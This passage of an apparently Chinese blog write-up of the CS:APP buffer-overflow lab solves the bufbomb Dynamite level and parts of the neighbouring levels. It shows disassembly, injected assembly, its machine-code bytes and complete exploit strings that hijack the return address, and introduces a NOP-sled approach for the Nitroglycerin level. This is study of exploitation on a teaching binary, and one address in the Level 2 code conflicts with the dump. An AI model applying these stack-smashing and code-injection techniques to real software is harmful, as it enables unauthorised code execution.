<h5 id="1-更改global-val的值为cookie"><a href="#1-更改global-val的值为cookie" class="headerlink" title="1.更改global_val的值为cookie"></a>1.更改global_val的值为cookie</h5><h5 id="2-将bang-函数的地址作为返回地址压栈"><a href="#2-将bang-函数的地址作为返回地址压栈" class="headerlink" title="2.将bang()函数的地址作为返回地址压栈"></a>2.将bang()函数的地址作为返回地址压栈</h5><p>查看bang()函数的汇编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble bang </span><br><span class="line">Dump of assembler code for function bang:</span><br><span class="line">   0x08048d52 &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x08048d53 &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08048d55 &lt;+3&gt;:	sub    $0x18,%esp</span><br><span class="line">   0x08048d58 &lt;+6&gt;:	mov    0x804d10c,%eax</span><br><span class="line">   0x08048d5d &lt;+11&gt;:	cmp    0x804d104,%eax</span><br><span class="line">   0x08048d63 &lt;+17&gt;:	jne    0x8048d8b &lt;bang+57&gt;</span><br><span class="line">   0x08048d65 &lt;+19&gt;:	mov    %eax,0x8(%esp)</span><br><span class="line">   0x08048d69 &lt;+23&gt;:	movl   $0x804a4ac,0x4(%esp)</span><br><span class="line">   0x08048d71 &lt;+31&gt;:	movl   $0x1,(%esp)</span><br><span class="line">   0x08048d78 &lt;+38&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048d7d &lt;+43&gt;:	movl   $0x2,(%esp)</span><br><span class="line">   0x08048d84 &lt;+50&gt;:	call   0x8049280 &lt;validate&gt;</span><br><span class="line">   0x08048d89 &lt;+55&gt;:	jmp    0x8048da3 &lt;bang+81&gt;</span><br><span class="line">   0x08048d8b &lt;+57&gt;:	mov    %eax,0x8(%esp)</span><br><span class="line">   0x08048d8f &lt;+61&gt;:	movl   $0x804a2c2,0x4(%esp)</span><br><span class="line">   0x08048d97 &lt;+69&gt;:	movl   $0x1,(%esp)</span><br><span class="line">   0x08048d9e &lt;+76&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048da3 &lt;+81&gt;:	movl   $0x0,(%esp)</span><br><span class="line">   0x08048daa &lt;+88&gt;:	call   0x80488d0 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到bang()函数的首地址为0x08048d52</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048d58 &lt;+6&gt;:	mov    0x804d10c,%eax</span><br><span class="line">0x08048d5d &lt;+11&gt;:	cmp    0x804d104,%eax</span><br></pre></td></tr></table></figure>

<p>这两段代码可以看出global_val的地址为0x804d10c,0x804d104存放的是cookie的值</p>
<p>故攻击代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x685c1d96,%eax  //将cookie值存入eax寄存器</span><br><span class="line">movl %eax,0x804d104 //将eax中的（cookie）值存入global_value的地址</span><br><span class="line">pushl $0x08048d52  //将bang作为返回地址压栈 </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>将其保存为2.s文件</p>
<p>接下来将汇编代码(2.s)转化成二进制文件(2.o)，并用objdump -d 命令查看</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ as 2.s -o 2.o</span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ objdump -d 2.o</span><br><span class="line"></span><br><span class="line">2.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	b8 96 1d 5c 68       	mov    $0x685c1d96,%eax</span><br><span class="line">   5:	a3 0c d1 04 08       	mov    %eax,0x804d10c</span><br><span class="line">   a:	68 52 8d 04 08       	push   $0x8048d52</span><br><span class="line">   f:	c3                   	ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到有效攻击代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 96 1d 5c 68</span><br><span class="line">a3 0c d1 04 08</span><br><span class="line">68 52 8d 04 08</span><br><span class="line">c3 </span><br></pre></td></tr></table></figure>



<p>最后，查看buf缓冲区的首地址</p>
<p>查看getbuf()汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ gdb -q bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x08049262 &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x08049263 &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08049265 &lt;+3&gt;:	sub    $0x38,%esp</span><br><span class="line">   0x08049268 &lt;+6&gt;:	lea    -0x28(%ebp),%eax</span><br><span class="line">   0x0804926b &lt;+9&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x0804926e &lt;+12&gt;:	call   0x8048c32 &lt;Gets&gt;</span><br><span class="line">   0x08049273 &lt;+17&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x08049278 &lt;+22&gt;:	leave  </span><br><span class="line">   0x08049279 &lt;+23&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08049268 &lt;+6&gt;:	lea    -0x28(%ebp),%eax</span><br><span class="line">0x0804926b &lt;+9&gt;:	mov    %eax,(%esp)</span><br></pre></td></tr></table></figure>

<p>gdb调试，设置断点在0x0804926b，并查看寄存器eax即可得知buf首地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x0804926b</span><br><span class="line">Breakpoint 1 at 0x804926b</span><br><span class="line">(gdb) r -u 202026010521</span><br><span class="line">Starting program: /home/lkl/桌面/计算机系统/buflab-handout/bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804926b in getbuf ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line"><span class="meta">$</span><span class="language-bash">1 = 0x55683848</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>buf首地址为0x55683848</p>
<h5 id="答案及结果-1"><a href="#答案及结果-1" class="headerlink" title="答案及结果"></a>答案及结果</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./2.txt</span><br><span class="line">b8 96 1d 5c 68</span><br><span class="line">a3 0c d1 04 08</span><br><span class="line">68 52 8d 04 08</span><br><span class="line">c3 //攻击代码</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 //填充代码</span><br><span class="line">48 38 68 55 //buff首地址</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw &lt; 2.txt | ./bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:Bang!: You set global_value to 0x685c1d96</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="4-Level-3-Dynamite-20-pts"><a href="#4-Level-3-Dynamite-20-pts" class="headerlink" title="4.Level 3: Dynamite (20 pts)"></a>4.Level 3: Dynamite (20 pts)</h1><p>Your job for thislevel is to supply an exploit string that will cause getbuf to return yourcookie back to test, rather than the value 1. You can see in the code for testthat this will cause the program to go“Boom!.” Your exploit code should set your cookie asthe return value, restore any corrupted state, push the correct return locationon the stack, and execute a ret instruction to really return to test.</p>
<p>题意解析：</p>
<p>这次要求getbuf调用后，返回到test当中，但是不能破坏为test函数维护的堆栈状态（test函数加了堆栈状态检测），同时要让test函数调用getbuf后的返回值（val）为自己的cookie。</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>test，getbuf源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="comment">/* Put canary on stack to detect possiblecorruption */</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = uniqueval();</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="comment">/* Check for corruption stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != uniqueval())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has beencorrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned0x%x\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>查看getbuf(),test()汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ gdb -q bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x08049262 &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x08049263 &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08049265 &lt;+3&gt;:	sub    $0x38,%esp</span><br><span class="line">   0x08049268 &lt;+6&gt;:	lea    -0x28(%ebp),%eax</span><br><span class="line">   0x0804926b &lt;+9&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x0804926e &lt;+12&gt;:	call   0x8048c32 &lt;Gets&gt;</span><br><span class="line">   0x08049273 &lt;+17&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x08049278 &lt;+22&gt;:	leave  </span><br><span class="line">   0x08049279 &lt;+23&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">(gdb) disassemble test</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x08048e3c &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x08048e3d &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08048e3f &lt;+3&gt;:	push   %ebx</span><br><span class="line">   0x08048e40 &lt;+4&gt;:	sub    $0x24,%esp</span><br><span class="line">   0x08048e43 &lt;+7&gt;:	call   0x8048c18 &lt;uniqueval&gt;</span><br><span class="line">   0x08048e48 &lt;+12&gt;:	mov    %eax,-0xc(%ebp)</span><br><span class="line">   0x08048e4b &lt;+15&gt;:	call   0x8049262 &lt;getbuf&gt;</span><br><span class="line">   0x08048e50 &lt;+20&gt;:	mov    %eax,%ebx</span><br><span class="line">   0x08048e52 &lt;+22&gt;:	call   0x8048c18 &lt;uniqueval&gt;</span><br><span class="line">   0x08048e57 &lt;+27&gt;:	mov    -0xc(%ebp),%edx</span><br><span class="line">   0x08048e5a &lt;+30&gt;:	cmp    %edx,%eax</span><br><span class="line">   0x08048e5c &lt;+32&gt;:	je     0x8048e74 &lt;test+56&gt;</span><br><span class="line">   0x08048e5e &lt;+34&gt;:	movl   $0x804a460,0x4(%esp)</span><br><span class="line">   0x08048e66 &lt;+42&gt;:	movl   $0x1,(%esp)</span><br><span class="line">   0x08048e6d &lt;+49&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048e72 &lt;+54&gt;:	jmp    0x8048eba &lt;test+126&gt;</span><br><span class="line">   0x08048e74 &lt;+56&gt;:	cmp    0x804d104,%ebx</span><br><span class="line">   0x08048e7a &lt;+62&gt;:	jne    0x8048ea2 &lt;test+102&gt;</span><br><span class="line">   0x08048e7c &lt;+64&gt;:	mov    %ebx,0x8(%esp)</span><br><span class="line">   0x08048e80 &lt;+68&gt;:	movl   $0x804a31a,0x4(%esp)</span><br><span class="line">   0x08048e88 &lt;+76&gt;:	movl   $0x1,(%esp)</span><br><span class="line">   0x08048e8f &lt;+83&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src= "https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/79aa9224-5aab-479d-86a1-de377b1b3f41.jpg" data-lazy-src="https://img-blog.csdnimg.cn/0d0b08a02aa946e6a2fde0f847c1846d.png#pic_center" alt="在这里插入图片描述"></p>
<p>由于此题开始要求回到test()函数，并且函数的栈空间不能被破坏，也就是test() 的ebp地址被冲掉之后还得给它存回去，那么在buf缓冲区的对应位置存回test() 的esp地址即可，返回地址依然存buf缓冲区的首地址，植入攻击代码，攻击代码的内容为：修改返回值即eax的值为cookie并重新回到test() 函数</p>
<p>上一题已经得知buf首地址为0x55683848，接下来要知道test() esp 的值</p>
<p>gdb设置断点在getbuf()函数(见上面的汇编码)中的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048e3c &lt;+0&gt;:	push   %ebp</span><br><span class="line">0x08048e3d &lt;+1&gt;:	mov    %esp,%ebp</span><br></pre></td></tr></table></figure>

<p>0x08048e3d这个位置，此时test()的ebp地址已经被压入栈中，然后查看ebp所存的值</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x08049263</span><br><span class="line">Breakpoint 4 at 0x8049263</span><br><span class="line">(gdb) r -u 202026010521</span><br><span class="line">Starting program: /home/lkl/桌面/计算机系统/buflab-handout/bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x08049263 in getbuf ()</span><br><span class="line">(gdb) p/x $ebp</span><br><span class="line"><span class="meta">$</span><span class="language-bash">4 = 0x556838a0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到test()ebp地址的值为0x556838a0</p>
<p>接下来编写攻击代码，即将eax的值改为cookie，并且将程序返回到test()函数中，即test()函数调用getbuf()的下一条指令的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048e4b &lt;+15&gt;:	call   0x8049262 &lt;getbuf&gt;</span><br><span class="line">0x08048e50 &lt;+20&gt;:	mov    %eax,%ebx</span><br></pre></td></tr></table></figure>

<p>0x08048e50</p>
<p>故攻击代码编写如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x685c1d96,%eax  ;返回cookie值</span><br><span class="line">pushl $0x08048e50        ;返回地址指向test中的getbuf调用后一条指令</span><br><span class="line">ret                     ;返回test继续执行</span><br></pre></td></tr></table></figure>

<p>重复上一关的操作得到有效攻击代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b8 96 1d 5c 68</span><br><span class="line">68 50 8e 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure>



<p>答案及结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./3.txt</span><br><span class="line">b8 96 1d 5c 68</span><br><span class="line">68 50 8e 04 08</span><br><span class="line">c3 //攻击代码</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">a0 38 68 55 //test()函数的ebp栈底地址</span><br><span class="line">48 38 68 55 //buf缓冲区首地址</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw &lt; 3.txt | ./bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:Boom!: getbuf returned 0x685c1d96</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="5-Level4-Nitroglycerin-10-pts"><a href="#5-Level4-Nitroglycerin-10-pts" class="headerlink" title="5.Level4: Nitroglycerin (10 pts)"></a>5.Level4: Nitroglycerin (10 pts)</h1><p>For this level, we have gone theopposite direction, making the stack positions even less stable than they normallyare. Hence the name “nitroglycerin”—an explosive that is notoriouslyunstable.When you run BUFBOMB with the command line flag “-n,” it will run in“Nitro” mode. Rather than calling the function getbuf, the program calls aslightly different function getbufn:</p>
<p>题意解析：</p>
<p>最后一关的要求和上一关一致，不过需要加上-n参数运行bufbomb，此时会进入testn和getbufn函数而不是test和getbuf函数。</p>
<p>testn(),getbufn()源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> KABOOM_BUFFER_SIZE 512</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">testn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = uniqueval();</span><br><span class="line">    val = getbufn();</span><br><span class="line">    <span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != uniqueval())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;KABOOM!: getbufn returned 0x%x\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbufn returned 0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getbufn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[KABOOM_BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>与3不同的是，这关会连续执行5次，且每一次test()函数的ebp地址会改变,然后buf缓冲区的大小变成了512，buf缓冲区的首地址在每次运行的时候也各不相同</p>
<p>看起来好像有点棘手，但实际上总空间大小是不变的进入buf缓冲区，还是顶掉返回地址，将返回地址设置成buf缓冲区的首地址，或者，buf缓冲区中间的某一个位置(因为buf缓冲区的首地址不确定了)，然后让其一直执行，直到缓冲区末尾，然后我们将攻击代码放置在某位，这样，就算每次开始执行的位置不同，最后也都能执行到攻击代码的位置。那么怎么使程序持续执行到缓冲区末尾呢?</p>
<p>nop指令可以帮我们做到这一点，其编码为0x90，所以我们将缓冲区的前面很长一部分都用0x90来填充，末尾部分填充攻击代码，这样就能达到要求了</p>
<p>攻击代码的功能和上一关是一样的，这里就不细说了，只是有一点，testn()函数的ebp地址不再固定，所以我们只能通过esp即栈顶指针加上testn()函数的空间大小来确定ebp的地址</p>
<p>查看testn()和getbufn()的汇编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function testn:</span><br><span class="line">   0x08048cce &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x08048ccf &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08048cd1 &lt;+3&gt;:	push   %ebx</span><br><span class="line">   0x08048cd2 &lt;+4&gt;:	sub    $0x24,%esp</span><br><span class="line">   0x08048cd5 &lt;+7&gt;:	call   0x8048c18 &lt;uniqueval&gt;</span><br><span class="line">   0x08048cda &lt;+12&gt;:	mov    %eax,-0xc(%ebp)</span><br><span class="line">   0x08048cdd &lt;+15&gt;:	call   0x8049244 &lt;getbufn&gt;</span><br><span class="line">   0x08048ce2 &lt;+20&gt;:	mov    %eax,%ebx</span><br><span class="line">   0x08048ce4 &lt;+22&gt;:	call   0x8048c18 &lt;uniqueval&gt;</span><br><span class="line">   0x08048ce9 &lt;+27&gt;:	mov    -0xc(%ebp),%edx</span><br><span class="line">   0x08048cec &lt;+30&gt;:	cmp    %edx,%eax</span><br><span class="line">   0x08048cee &lt;+32&gt;:	je     0x8048d06 &lt;testn+56&gt;</span><br><span class="line">   0x08048cf0 &lt;+34&gt;:	movl   $0x804a460,0x4(%esp)</span><br><span class="line">   0x08048cf8 &lt;+42&gt;:	movl   $0x1,(%esp)</span><br><span class="line">   0x08048cff &lt;+49&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048d04 &lt;+54&gt;:	jmp    0x8048d4c &lt;testn+126&gt;</span><br><span class="line">   0x08048d06 &lt;+56&gt;:	cmp    0x804d104,%ebx</span><br><span class="line">   0x08048d0c &lt;+62&gt;:	jne    0x8048d34 &lt;testn+102&gt;</span><br><span class="line">   0x08048d0e &lt;+64&gt;:	mov    %ebx,0x8(%esp)</span><br><span class="line">   0x08048d12 &lt;+68&gt;:	movl   $0x804a48c,0x4(%esp)</span><br><span class="line">   0x08048d1a &lt;+76&gt;:	movl   $0x1,(%esp)</span><br><span class="line">   0x08048d21 &lt;+83&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function getbufn:</span><br><span class="line">   0x08049244 &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x08049245 &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08049247 &lt;+3&gt;:	sub    $0x218,%esp</span><br><span class="line">   0x0804924d &lt;+9&gt;:	lea    -0x208(%ebp),%eax</span><br><span class="line">   0x08049253 &lt;+15&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x08049256 &lt;+18&gt;:	call   0x8048c32 &lt;Gets&gt;</span><br><span class="line">   0x0804925b &lt;+23&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x08049260 &lt;+28&gt;:	leave  </span><br><span class="line">   0x08049261 &lt;+29&gt;:	ret   </span><br></pre></td></tr></table></figure>

